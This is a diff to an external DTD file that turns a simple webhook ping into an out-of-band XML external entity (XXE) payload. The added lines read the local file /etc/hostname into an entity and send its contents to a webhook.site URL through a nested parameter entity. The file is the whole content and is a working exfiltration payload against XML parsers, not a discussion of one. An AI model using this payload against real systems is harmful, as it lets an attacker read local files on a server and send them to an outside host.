@@ -1,3 +1,5 @@
-<!ENTITY % callback SYSTEM "https://webhook.site/e850e7bf-a92e-488a-9378-0304f6f92200?event=dtd-loaded">
-%callback;
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/e850e7bf-a92e-488a-9378-0304f6f92200?data=%file;'>">
+%eval;
+%send;
 <!ENTITY test "beef">
